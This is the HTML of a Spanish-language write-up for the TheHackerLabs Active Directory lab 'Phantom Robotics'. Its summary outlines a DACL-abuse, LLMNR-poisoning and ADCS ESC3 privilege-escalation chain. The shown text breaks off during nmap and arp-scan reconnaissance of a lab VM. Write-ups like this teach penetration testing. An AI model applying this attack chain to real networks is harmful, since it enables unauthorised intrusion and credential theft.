@@ -1,0 +1,1848 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Phantom Robotics - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-phantom/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Phantom Robotics - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-phantom/Phantom.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-scapeRoom/">
+          <span class="side-post-card-title">ScapeRoom</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-zapp/">
+          <span class="side-post-card-title">ZAPP</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Phantom Robotics</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-thlpwn/">
+          <span class="side-post-card-title">THLPWN</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-help/">
+          <span class="side-post-card-title">Help</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Medium Machine</div>
+    
+    <h1>Phantom Robotics - TheHackerLabs</h1>
+    <div class="post-meta">29 April 2026 · 35 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-phantom/Phantom.png" alt="Phantom Robotics - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina algo complicada. Después de analizar los escaneos, nos dirigimos a enumerar el servicio SMB, pero al no encontrar nada, utilizamos las credenciales dadas para aplicar un RYD Cycling Attack, con tal de conocer todos los grupos y usuarios existentes de la máquina AD. También realizamos enumeración del servicio RPC, pero no encontramos algo relevante. Al no encontrar nada, utilizamos la herramienta bloodhound-python y BloodHound para enumerar el AD, siendo de esta forma que descubrimos una cadena de ataques AD-DACL que nos permite adueñarnos de un usuario con el que nos logueamos a la máquina víctima vía WinRM con Evil-WinRM. Además, aplicamos un LLMNR Poisoning, logrando capturar el Hash NTLMv2 de un usuario, que luego crackeamos con JohnTheRipper y resulta que también podemos loguearnos con este usuario. Dentro, encontramos un mensaje que nos da la pista sobre revisar la Tombstone del AD, siendo así que encontramos la contraseña de algún usuario, pero al desconocer de quién es, aplicamos un Password Spraying, descubriendo así a quién le pertenece esta contraseña. Utilizamos este nuevo usuario para buscar un Template vulnerable, ya que al usar winPEASx64, indica que hay varios Templates vulnerables que pueden ser usados para escalar privilegios. Una vez descubierto el Template vulnerable, vemos que podemos aplicar el ataque ESC3, logrando así escalar privilegios.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>arp-scan</code></li><li><code>nxc</code></li><li><code>smbmap</code></li><li><code>rpcclient</code></li><li><code>awk</code></li><li><code>bloodhound-python</code></li><li><code>impacket-owneredit</code></li><li><code>impacket-dacledit</code></li><li><code>net</code></li><li><code>bloodyAD</code></li><li><code>Evil-WinRM</code></li><li><code>responder</code></li><li><code>JohnTheRipper</code></li><li><code>PowerShell Commands</code></li><li><code>winPEASx64</code></li><li><code>certipy-ad</code></li><li><code>impacket-psexec</code></li><li><code>Metasploit Framework (msfconsole)</code></li><li><code>Meterpreter</code></li><li><code>Módulo: exploit/multi/handle</code></li><li><code>Msfvenom</code></li><li><code>Módulo: post/multi/recon/local_exploit_suggester</code></li><li><code>Módulo: exploit/windows/local/cve_2024_30085_cloud_files</code></li><li><code>type</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#SMB">Enumeración de Servicio SMB</a>
+          <ul>
+            <li><a href="#RYD">Aplicando RYD Cycling Attack</a></li>
+          </ul>
+        </li>
+        <li><a href="#RPC">Enumeración del Servicio RPC</a></li>
+        <li><a href="#BloodHound">Enumeración de AD con BloodHound-Python y BloodHound Ver 4.3.1</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#AttackChain">Aplicando Cadena de Ataques para Conectarnos a la Máquina Víctima - Abuso de AD-DACL</a>
+          <ul>
+            <li><a href="#WriteOwner">Abusando del Permiso WriteOwner para Cambiar Contraseña de Usuario bob</a></li>
+            <li><a href="#AddSelf">Abusando del Permiso AddSelf para Agregar al Usuario bob al Grupo IT</a></li>
+            <li><a href="#WriteDacl">Abusando del Permiso WriteDacl para Modificar Permisos del Objeto Grupo HELPDESK</a></li>
+            <li><a href="#ForcePassword">Abusando del Permiso ForceChangePassword para Cambiar la Contraseña del Usuario frank y Ganando Acceso a la Máquina Víctima</a></li>
+          </ul>
+        </li>
+        <li><a href="#Responder">Aplicando LLMNR Poisoning con Responder para Capturar Hash NTLMv2</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Tombstone">Analizando la Tombstone del AD y Aplicando Password Spraying</a></li>
+        <li><a href="#ESC3">Aplicando Ataque de Certificados ESC3 - ADCS ESC3: Enrollment Agent Template</a></li>
+        <li><a href="#Metasploit">Escalando Privilegios con Metasploit Framework</a>
+          <ul>
+            <li><a href="#Meterpreter">Obteniendo una Sesión de Meterpreter</a></li>
+            <li><a href="#MetasPrivesc">Escalando Privilegios con el Módulo cve_2024_30085_cloud_files</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#SMB">Enumeración de Servicio SMB</a>
+          <ul>
+            <li><a href="#RYD">Aplicando RYD Cycling Attack</a></li>
+          </ul>
+        </li>
+        <li><a href="#RPC">Enumeración del Servicio RPC</a></li>
+        <li><a href="#BloodHound">Enumeración de AD con BloodHound-Python y BloodHound Ver 4.3.1</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#AttackChain">Aplicando Cadena de Ataques para Conectarnos a la Máquina Víctima - Abuso de AD-DACL</a>
+          <ul>
+            <li><a href="#WriteOwner">Abusando del Permiso WriteOwner para Cambiar Contraseña de Usuario bob</a></li>
+            <li><a href="#AddSelf">Abusando del Permiso AddSelf para Agregar al Usuario bob al Grupo IT</a></li>
+            <li><a href="#WriteDacl">Abusando del Permiso WriteDacl para Modificar Permisos del Objeto Grupo HELPDESK</a></li>
+            <li><a href="#ForcePassword">Abusando del Permiso ForceChangePassword para Cambiar la Contraseña del Usuario frank y Ganando Acceso a la Máquina Víctima</a></li>
+          </ul>
+        </li>
+        <li><a href="#Responder">Aplicando LLMNR Poisoning con Responder para Capturar Hash NTLMv2</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Tombstone">Analizando la Tombstone del AD y Aplicando Password Spraying</a></li>
+        <li><a href="#ESC3">Aplicando Ataque de Certificados ESC3 - ADCS ESC3: Enrollment Agent Template</a></li>
+        <li><a href="#Metasploit">Escalando Privilegios con Metasploit Framework</a>
+          <ul>
+            <li><a href="#Meterpreter">Obteniendo una Sesión de Meterpreter</a></li>
+            <li><a href="#MetasPrivesc">Escalando Privilegios con el Módulo cve_2024_30085_cloud_files</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Hosts">Descubrimiento de Hosts</h3>
+<p>Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.</p>
+<p>Lo haremos primero con <strong>nmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 192.168.56.0/24
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-04-26 23:07 -0600
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.56.1
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00042s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>Unknown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.56.100
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00053s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.56.102
+</span></span><span style="display:flex;"><span>Host is up.
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">256</span> IP addresses <span style="color:#f92672">(</span><span style="color:#ae81ff">3</span> hosts up<span style="color:#f92672">)</span> scanned in 1.91 seconds
+</span></span></code></pre></div><p>Vamos a probar la herramienta <strong>arp-scan</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arp-scan -I eth0 -g 192.168.56.0/24
+</span></span><span style="display:flex;"><span>Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
+</span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>192.168.56.1	XX	PCS Systemtechnik GmbH
+</span></span><span style="display:flex;"><span>192.168.56.100	XX	PCS Systemtechnik GmbH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
+</span></span><span style="display:flex;"><span>Ending arp-scan 1.10.0: <span style="color:#ae81ff">256</span> hosts scanned in 2.143 seconds <span style="color:#f92672">(</span>119.46 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">2</span> responded
+</span></span></code></pre></div><p>Encontramos nuestro objetivo y es: <code>192.168.56.100</code>.</p>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.56.100
+</span></span><span style="display:flex;"><span>PING 192.168.56.100 <span style="color:#f92672">(</span>192.168.56.100<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.56.100: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.804 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.56.100: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>1.00 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.56.100: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.971 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.56.100: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.874 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.56.100 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3002ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.804/0.912/1.001/0.078 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Windows</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.56.100 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-04-26 23:09 -0600
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 23:09
+</span></span><span style="display:flex;"><span>Scanning 192.168.56.100 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 23:09, 0.06s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 23:09
+</span></span><span style="display:flex;"><span>Scanning 192.168.56.100 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 53/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 3269/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 59503/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 59466/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 593/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 59458/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 88/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 9389/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 464/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 636/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 3268/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 59464/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 59487/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 5985/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 49664/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 59478/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Discovered open port 389/tcp on 192.168.56.100
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 23:09, 26.32s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.56.100
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.00060s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2026-04-26 23:09:21 CST <span style="color:#66d9ef">for</span> 26s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65515</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE          REASON
+</span></span><span style="display:flex;"><span>53/tcp    open  domain           syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec     syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc            syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap             syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds     syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5         syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap   syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP    syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman            syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>9389/tcp  open  adws             syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49664/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>59458/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>59464/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>59466/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>59478/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>59487/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>59503/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 26.50 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">131053</span> <span style="color:#f92672">(</span>5.766MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">23</span> <span style="color:#f92672">(</span>996B<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Vemos muchos puertos abiertos, entre ellos el <strong>puerto 88</strong>, que nos indica el uso del <strong>servicio Kerberos</strong>, por lo que nos enfrentaremos a una máquina <strong>Active Directory</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,59458,59464,59466,59478,59487,59503 192.168.56.100 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-04-26 23:10 -0600
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.56.100
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0016s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2026-04-27 05:25:32Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: PHANTOM.THL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-04-27T05:26:59+00:00; +15m15s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.PHANTOM.THL
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.PHANTOM.THL
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-02-21T23:24:38
+</span></span><span style="display:flex;"><span>|_Not valid after:  2027-02-21T23:24:38
